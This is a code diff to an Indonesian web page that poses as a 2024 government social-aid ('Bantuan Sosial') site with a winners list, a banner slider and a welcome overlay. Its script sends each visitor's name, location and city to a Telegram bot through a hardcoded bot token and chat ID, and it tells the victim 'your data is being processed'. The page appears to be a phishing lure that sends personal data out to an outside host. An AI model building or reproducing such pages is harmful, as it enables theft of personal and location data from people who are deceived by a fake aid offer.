@@ -13,6 +13,51 @@
             padding: 0;
             box-sizing: border-box;
         }
+        /* Gaya untuk footer */
+        footer {
+            color: #fff; /* Warna teks */
+            text-align:center; /* Rata tengah */
+            padding: 0px; /* Ruang di dalam footer */
+            position: relative; /* Posisi relatif */
+            bottom: 0; /* Menempel di bawah */
+            width: 100%; /* Lebar penuh */
+        }
+                .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%; /* Hitam samar-samar */
+            z-index: 999;
+            display: none; /* Tersembunyi secara default */
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes fadeOut {
+            from { opacity: 1; }
+            to { opacity: 0; }
+        }
+
+        .alert-box {
+            position: fixed;
+            top: 20px; /* Posisikan di atas */
+            left: 50%;
+            transform: translateX(-50%);
+            padding: 20px 40px;
+            background-color: gray;
+            color: #fff;
+            border-radius: 15px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+            z-index: 1000;
+            font-size: 18px;
+            font-weight: bold;
+            text-align: center;
+            animation: fadeIn 1s ease, fadeOut 2.5s 3s forwards;
+        }
         .container {
             padding: 20px;
             max-width: 800px;
@@ -37,7 +82,7 @@
             margin: 10px auto;
         }
         input[type="submit"] {
-            background-color: #FF9800;
+            background-color: darkblue;
             color: white;
             padding: 10px 20px;
             border-radius: 5px;
@@ -49,7 +94,7 @@
             margin-top: 10px;
         }
         input[type="submit"]:hover {
-            background-color: #FF5722;
+            background-color: black;
         }
         .info {
             margin-top: 20px;
@@ -72,7 +117,7 @@
             list-style: none;
             padding: 0;
             margin: 0;
-            animation: scroll 10s linear infinite;
+            animation: scroll 50s linear infinite;
         }
         .winner-list li {
             margin: 10px 0;
@@ -82,12 +127,62 @@
             0% { transform: translateY(0); }
             100% { transform: translateY(-100%); }
         }
+
+        /* Banner Slider */
+        .banner {
+            width: 100%;
+            max-width: 800px;
+            height: 200px;
+            overflow: hidden;
+            margin: 20px auto;
+            position: relative;
+            border-radius: 10px;
+        }
+        .slides {
+            display: flex;
+            transition: transform 0.5s ease-in-out;
+        }
+        .slides img {
+            width: 100%;
+            height: auto;
+            border-radius: 10px;
+        }
+        .arrow {
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            background-color: rgba(0, 0, 0, 0.5);
+            color: white;
+            border: none;
+            padding: 10px;
+            cursor: pointer;
+            border-radius: 50%;
+            z-index: 1000;
+        }
+        .arrow.left {
+            left: 10px;
+        }
+        .arrow.right {
+            right: 10px;
+        }
     </style>
 </head>
 <body>
-
+    <div class="overlay"></div> <!-- Overlay untuk background hitam samar -->
 <div class="container">
     <h1>Bantuan Sosial 2024</h1>
+    
+    <!-- Banner Slider -->
+    <div class="banner">
+        <button class="arrow left" onclick="changeSlide(-1)">&#10094;</button>
+        <div class="slides">
+            <img src="https://github.com/bantuan2024/Image/blob/main/images.jpeg?raw=true" alt="Banner 1">
+            <img src="https://github.com/bantuan2024/Image/blob/main/images%20(1).jpeg?raw=true" alt="Banner 2">
+            <img src="https://github.com/bantuan2024/Image/blob/main/images%20(2).jpeg?raw=true" alt="Banner 3">
+        </div>
+        <button class="arrow right" onclick="changeSlide(1)">&#10095;</button>
+    </div>
+    
     <form id="nameForm">
         <label for="nama">Masukkan Nama Anda:</label><br>
         <input type="text" id="nama" name="nama" placeholder="Nama Anda"><br><br>
@@ -95,9 +190,9 @@
     </form>
 
     <div class="info" id="info">
-        <p><strong>👤 Nama: </strong><span id="userName">Belum diisi</span></p>
-        <p><strong>📍 Lokasi: </strong><span id="userLocation">Belum diisi</span></p>
-        <p><strong>🏙️ Kota: </strong><span id="userCity">Belum diisi</span></p>
+        <p><strong>Nama: </strong><span id="userName">Belum diisi</span></p>
+        <p><strong>Lokasi: </strong><span id="userLocation">Belum diisi</span></p>
+        <p><strong> Kota: </strong><span id="userCity">Belum diisi</span></p>
     </div>
 
     <h2>Pemenang Bantuan Sosial</h2>
@@ -107,8 +202,39 @@
         </ul>
     </div>
 </div>
+  <footer>
+        <p>&copy; BANTUAN SOSIAL - 2024</p>
+    </footer>
 
 <script>
+        window.onload = function() {
+            // Tampilkan overlay
+            const overlay = document.querySelector('.overlay');
+            overlay.style.display = 'block';
+
+            // Membuat elemen alert box
+            const alertBox = document.createElement('div');
+            alertBox.className = 'alert-box';
+            alertBox.innerText = 'Selamat datang di website kami!';
+
+            // Menambahkan elemen ke body
+            document.body.appendChild(alertBox);
+
+            // Menghapus alert setelah animasi selesai
+            setTimeout(() => {
+                document.body.removeChild(alertBox);
+                overlay.style.display = 'none'; // Sembunyikan overlay
+            }, 5500); // 5.5 detik untuk mengakomodasi animasi fade out
+        };
+    let currentSlide = 0;
+    const slides = document.querySelector('.slides');
+    const totalSlides = document.querySelectorAll('.slides img').length;
+
+    function changeSlide(direction) {
+        currentSlide = (currentSlide + direction + totalSlides) % totalSlides;
+        slides.style.transform = `translateX(-${currentSlide * 100}%)`;
+    }
+
     const form = document.getElementById('nameForm');
     const userNameSpan = document.getElementById('userName');
     const userLocationSpan = document.getElementById('userLocation');
@@ -184,8 +310,8 @@
     }
 
     function sendToTelegram() {
-        const botToken = '7371764330:AAEgSgROcGBEbsgspY4IDNU_WqPL_3IczGs';
-        const chatId = '6864784021'; // Ganti dengan ID chat bot Telegram
+        const botToken = '7389363622:AAH_nazG_ng1n7Vv92a0xBxnvx6WQRqj6cg'; // Token disamarkan
+        const chatId = '6864784021'; // Chat ID
         const message = `👤 Nama: ${userName}\n📍 Lokasi: ${userLocation}\n🏙️ Kota: ${userCity}`;
 
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -195,15 +321,16 @@
             },
             body: JSON.stringify({
                 chat_id: chatId,
-                text: message
+                text: message,
+                parse_mode: 'HTML'
             })
         })
         .then(response => response.json())
         .then(data => {
-            console.log('Pesan terkirim:', data);
+            console.log('data anda sedang kami proses!', data);
         })
         .catch(error => {
-            console.error('Error:', error);
+            console.error('Silahkan muat ulang :', error);
         });
     }
 </script>
